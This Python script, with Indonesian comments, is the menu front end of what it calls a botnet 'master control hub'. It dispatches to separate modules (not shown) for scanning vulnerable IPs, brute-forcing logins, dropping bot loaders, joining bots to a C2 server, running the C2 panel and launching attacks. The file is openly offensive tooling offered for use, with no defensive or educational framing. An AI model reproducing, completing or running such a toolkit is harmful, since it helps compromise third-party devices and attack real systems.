# ZENO-MB.py
import os
import time
from colorama import Fore, init

# Import modul utama (pastikan semua file: scanner.py, brute.py, loader.py, botjoin.py, c2panel.py, attacker.py ada)
from scanner import run_scanner
from brute import run_brute
from loader import run_loader
from botjoin import run_botjoin
from c2panel import run_c2panel
from attacker import run_attack_mode  # Ganti 'attack' jadi fungsi utama: run_attack_mode()

init(autoreset=True)

BANNER = f"""{Fore.RED}
╔═══════════════════════════════════════════════╗
║        🔥 ZENO-MB: MASTER CONTROL HUB 🔥       ║
║          HDN Cyber Forces | by RIFQI          ║
╠═══════════════════════════════════════════════╣
║ [1] Scanner IP Rentan 🌐                      ║
║ [2] Brute Forcer Login 🔓                    ║
║ [3] Loader Dropper Bot 📦                    ║
║ [4] Join Bot ke C2 🤖                        ║
║ [5] Pantau & Kontrol C2 Panel 🧠             ║
║ [6] Launch Attack 🔥                         ║
║ [0] Exit ❌                                  ║
╚═══════════════════════════════════════════════╝
"""

while True:
    os.system("clear")
    print(BANNER)
    pilihan = input(Fore.CYAN + "Pilih menu: ")

    if pilihan == "1":
        run_scanner()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "2":
        run_brute()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "3":
        run_loader()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "4":
        run_botjoin()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "5":
        run_c2panel()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "6":
        run_attack_mode()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "0":
        print(Fore.MAGENTA + "\nKeluar dari ZENO-MB... Sampai jumpa.")
        break

    else:
        print(Fore.RED + "[!] Pilihan tidak valid!")
        time.sleep(1)
